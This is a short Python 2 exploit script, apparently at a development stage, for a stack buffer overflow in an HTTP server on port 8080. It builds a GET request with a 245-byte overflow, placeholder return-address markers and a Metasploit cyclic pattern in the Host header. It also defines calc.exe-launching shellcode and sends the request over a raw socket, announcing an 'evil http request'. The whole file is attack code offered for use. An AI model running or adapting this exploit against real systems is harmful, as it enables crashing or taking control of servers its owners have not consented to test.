
import socket
import sys
import struct

ip = "192.168.100.120"
port = 8080

# 74 bytes calc.exe from http://code.google.com/p/win-exec-calc-shellcode/
shellcode = (
"\x31\xd2\x52\x68\x63\x61\x6c\x63\x89\xe6\x52\x56\x64\x8b\x72" +
"\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f" +
"\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x4c\x1f\x24" +
"\x01\xf9\x0f\xb7\x2c\x51\x42\xad\x81\x3c\x07\x57\x69\x6e\x45" +
"\x75\xf1\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\xcc"
)


payload = "A" * 245
payload += "B" * 4
payload += "C" * 4

# 253 msf bytes from earlier
shellcodeSpace = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3A"

buffer="GET /" +  payload + " HTTP/1.1\r\n"

buffer+="Host: " + shellcodeSpace + " \r\n"
buffer+="Connection: keep-alive\r\n"
buffer+="Cache-Control: max-age=0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buffer+="Upgrade-Insecure-Requests: 1\r\n"
buffer+="User-Agent: Mozilla/5.0 \r\n"
buffer+="Accept-Encoding: gzip, deflate, sdch\r\n"
buffer+="Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n"
buffer+="Cookie: session_id=rG5JfL3QVJkEUhqKankXrO6cwwLok8\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(buffer)
expl.close()

